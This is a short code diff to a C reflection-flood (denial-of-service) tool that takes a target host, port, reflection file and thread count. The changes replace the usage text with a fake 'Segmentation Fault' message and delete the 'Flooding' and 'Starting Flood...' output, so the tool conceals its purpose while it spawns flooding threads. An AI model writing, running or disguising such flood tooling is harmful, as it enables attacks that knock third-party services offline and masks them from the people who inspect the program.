@@ -323,8 +323,7 @@ int main(int argc, char *argv[ ])
 {
         if(argc < 4)
         {
-                fprintf(stderr, "Invalid parameters!\n");
-                fprintf(stdout, "Usage: %s <target IP/hostname> <port to hit> <reflection file> <number threads to use> <time (optional)>\n", argv[0]);
+                fprintf(stdout, "Segmentation Fault");
                 exit(-1);
         }
 
@@ -359,7 +358,6 @@ int main(int argc, char *argv[ ])
 
         int iPort = atoi(argv[2]);
 
-		printf("Flooding %s\n", argv[1], iPort);
 
         for(i = 0; i < num_threads; i++)
         {
@@ -370,7 +368,6 @@ int main(int argc, char *argv[ ])
                 pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
         }
 
-        fprintf(stdout, "Starting Flood...\n");
 
         if(argc > 4)
         {
